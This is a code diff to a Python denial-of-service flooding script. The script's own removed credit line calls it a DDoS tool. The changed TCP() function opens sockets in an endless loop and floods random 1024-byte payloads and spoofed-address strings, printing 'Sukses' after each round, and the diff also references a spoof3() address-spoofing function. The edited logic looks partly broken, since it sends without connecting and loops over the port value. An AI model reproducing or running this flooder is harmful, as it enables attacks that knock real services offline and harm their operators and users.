@@ -308,7 +308,7 @@ def spoof3():
     return addres
 
 byte1 = random._urandom(1024)
-tp = """This Ddos Credit:ZanGanteng"""
+
 
 def TCP():
   global byte1, useragents, socks2, ref
@@ -322,15 +322,15 @@ def TCP():
   while True:
         try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-           s.send(byte1)
-           s.send(byte1)
-           s.sendall(str.encode(byte_ip))
-           s.sendall(str.encode(byte_ip))
-           for x in range(20000000):
-              s.send(byte1)
-              s.send(byte1)
-              s.sendall(str.encode(byte_ip))
-              s.sendall(str.encode(byte_ip))
+           s.send(str.encode(byte_ip))
+           s.send(str.encode(byte_ip))
+           s.sendall((byte1))
+           s.sendall((byte1))
+           for x in range(port):
+              s.send(str.encode(byte_ip))
+              s.send(str.encode(byte_ip))
+              s.sendall((byte1))
+              s.sendall((byte1))
               print("Sukses")
         except:
           s.close()
